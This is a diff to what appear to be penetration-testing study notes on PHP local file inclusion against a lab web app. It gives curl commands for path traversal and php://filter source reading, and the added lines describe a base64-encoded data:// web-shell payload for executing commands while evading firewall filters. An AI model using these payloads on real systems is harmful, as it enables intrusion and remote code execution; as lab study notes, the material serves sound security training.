@@ -179,3 +179,5 @@ quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:
 - Encoding the output for base64: ```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```
   - Decoding the encoded output: ```echo "<output>" | base64 -d```
 - Using the ```data://``` call executing the ```ls``` command: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"```
+- When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper: ```echo -n '<?php echo system($_GET["cmd"]);?>' | base64```
+  - Then: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,<output>&cmd=ls"```
